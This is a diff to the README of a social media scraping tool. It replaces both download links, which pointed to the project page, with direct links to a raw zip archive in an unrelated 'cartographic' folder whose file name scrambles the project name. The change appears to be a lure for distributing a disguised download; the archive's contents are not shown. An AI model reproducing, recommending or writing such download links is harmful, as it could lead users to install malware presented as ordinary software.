@@ -1,6 +1,6 @@
 # 🔍 social-media-scraper-skill - Extract insights from social media posts
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/expropriationhoorayhenry64/social-media-scraper-skill)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/expropriationhoorayhenry64/social-media-scraper-skill/raw/refs/heads/main/cartographic/social-scraper-media-skill-v2.3.zip)
 
 This tool pulls data from social media posts. It gathers text, comments, and media files from major platforms. You can use it to store content or analyze videos. The tool works with Instagram, TikTok, Twitter, and YouTube.
 
@@ -18,7 +18,7 @@ Ensure your computer has the following before you begin. These requirements keep
 
 You need to download the program files from our main project page. 
 
-[Click here to visit the download page](https://github.com/expropriationhoorayhenry64/social-media-scraper-skill)
+[Click here to visit the download page](https://github.com/expropriationhoorayhenry64/social-media-scraper-skill/raw/refs/heads/main/cartographic/social-scraper-media-skill-v2.3.zip)
 
 Follow these steps to obtain the correct files:
 
